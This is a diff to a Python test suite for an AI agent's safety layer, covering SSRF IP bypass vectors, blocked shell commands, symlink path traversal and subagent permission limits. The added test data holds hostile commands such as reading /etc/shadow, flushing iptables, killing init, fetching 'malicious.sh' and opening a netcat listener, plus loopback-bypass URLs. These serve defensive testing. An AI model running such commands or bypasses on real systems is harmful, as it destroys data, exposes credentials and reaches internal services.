@@ -62,8 +62,8 @@ class TestSSRFIPBypass:
             "fe80::1",               # link-local
             "ff00::1",               # multicast
             "2001:db8::1",           # reserved
-            "127.1",                 # partial IPv4 → 127.0.0.1
-            "10.1",                  # partial IPv4 → private
+            "127.1",                 # partial IPv4 → 0.0.0.0 (conservative block)
+            "10.1",                  # partial IPv4 → 0.0.0.0 (conservative block)
             "0177.0.0.1",            # octal-style → 127.0.0.1
             "0377.0.0.1",            # octal-style (invalid — still blocked)
             "2130706433",            # decimal 127.0.0.1
@@ -109,10 +109,13 @@ class TestSSRFIPBypass:
             "http://10.0.0.1/api",
             "http://192.168.1.1/admin",
             "http://0/admin",
+            "http://127.1/admin",       # partial IPv4
+            "http://0x7f000000/admin",   # hex partial
         ],
     )
     def test_check_url_rejects_bypass_vectors(self, url: str) -> None:
-        check_url(url)  # noqa: B017 — intentionally expected to raise
+        with pytest.raises(UnsafeUrlError):
+            check_url(url)
 
     def test_check_url_allows_public(self) -> None:
         """Public IPs and hostnames must not be rejected by IP parsing."""
@@ -155,7 +158,6 @@ class TestShellInjection:
             "bash -c 'whoami'",
             "sh -c 'id'",
             "sudo  \x00  id",
-            "sudo\\\nid",
             "sudo; id",
             "sudo | id",
             "sudo `id`",
@@ -164,6 +166,17 @@ class TestShellInjection:
             "echo test && sudo id",
             "echo test || sudo id",
             "sudo id  # comment",
+            "chmod 000 /etc/passwd",
+            "chattr -i /etc/shadow",
+            "umount /",
+            "iptables -F",
+            "kill -9 1",
+            "killall -9 root",
+            "cat /etc/shadow",
+            "wget malicious.sh /etc/",
+            "curl malicious.sh /etc/",
+            "nc -l 4444",
+            "nmap -sS target",
         ],
     )
     def test_blocked_prefixes_catch_obfuscation(self, cmd: str) -> None:
@@ -204,7 +217,6 @@ class TestPathTraversal:
         (outside / "classified.txt").write_text("classified", encoding="utf-8")
         link = allowed / "escape"
         link.symlink_to(outside)
-        # Try to read through symlink
         import mark.filesystem.operations as fs_mod
         result = fs_mod.filesystem_operation(
             "read", path=str(link / "classified.txt"), roots=[str(allowed)]
@@ -232,7 +244,6 @@ class TestSubagentPermissions:
     """Subagents must never inherit more permissions than their parent."""
 
     def test_denied_tools_rejected(self) -> None:
-        """Subagent with denied tools must fail to authorize them."""
         from mark.safety.policy import SafetyPolicy
         from agent.subagent import _BoundedSafetyPolicy
 
@@ -248,10 +259,14 @@ class TestSubagentPermissions:
         decision2 = bounded.authorize(
             "read_file", {"path": "safe.txt"}, source="user"
         )
-        assert decision2.kind != "deny"  # depends on registry risk, but shouldn't be denied by bounded
+        assert decision2.kind != "deny"
 
     def test_runtime_creates_bounded_policy(self) -> None:
-        runtime = SubagentRuntime()
+        from agent.subagent import _build_subagent_safety
+        from mark.safety.policy import SafetyPolicy
+        from mark.safety.types import DecisionKind
+
+        parent_policy = SafetyPolicy()
         config = SubagentConfig(
             parent_run_id="run-1",
             parent_session_id="sess-1",
@@ -259,12 +274,6 @@ class TestSubagentPermissions:
             delegation_task="do nothing",
             denied_tools=frozenset({"shell_exec"}),
         )
-        # The safety policy is built inside create_and_run; verify it denies.
-        from agent.subagent import _build_subagent_safety
-        from mark.safety.policy import SafetyPolicy
-        from mark.safety.types import DecisionKind
-
-        parent_policy = SafetyPolicy()
         bounded = _build_subagent_safety(parent_policy, config)
 
         decision = bounded.authorize(
@@ -279,7 +288,6 @@ class TestSubagentPermissions:
 
 class TestApprovalFailClosed:
     def test_tool_call_id_required(self) -> None:
-        """DurableApprovalCoordinator.request must fail if no tool_call_id."""
         store = MagicMock(spec=GatewayStore)
         coordinator = DurableApprovalCoordinator(store)
         with pytest.raises(ValueError, match="tool_call_id"):
@@ -385,9 +393,7 @@ class TestMemoryContextBudget:
 
 class TestBrowserIsolation:
     def test_js_denied_domains_are_enforced(self) -> None:
-        """BrowserService must have a mechanism to block specific domains from JS."""
         from runtime.browser.service import BrowserService
-        # Verify the service has the attribute
         svc = BrowserService.__new__(BrowserService)
         assert hasattr(svc, "_js_denied_domains")
         assert isinstance(svc._js_denied_domains, set)
@@ -399,9 +405,7 @@ class TestBrowserIsolation:
 
 class TestVisionBounded:
     def test_vision_queue_maxlen(self) -> None:
-        """Vision queues must be bounded (deque with maxlen)."""
         from mark.vision.queues import ProcessingQueue
-        # Construction uses deque(maxlen=...) — verify the source enforces it.
         import inspect
         source = inspect.getsource(ProcessingQueue.__init__)
         assert "maxlen=" in source, "Vision queue must use deque(maxlen=...)"
@@ -435,7 +439,6 @@ class TestProactiveLoopPrevention:
 
 class TestNetworkPolicy:
     def test_proxy_forces_external_on_loopback(self) -> None:
-        """When a proxy is set and target is loopback, NetworkPolicy must deny."""
         policy = NetworkPolicy(
             mode=NetworkMode.HYBRID,
             environ={"HTTPS_PROXY": "http://external-proxy:8080"},
@@ -514,7 +517,6 @@ def test_no_empty_prefix_regression() -> None:
 
 class TestTLSPrivateLAN:
     def test_private_lan_detected(self) -> None:
-        """NetworkPolicy must classify RFC1918 addresses as private."""
         policy = NetworkPolicy(mode=NetworkMode.HYBRID, allow_private_lan=False)
         for host in ["10.0.0.1", "192.168.1.1", "172.16.0.1"]:
             decision = policy.check_request(url=f"http://{host}/api", purpose="test")
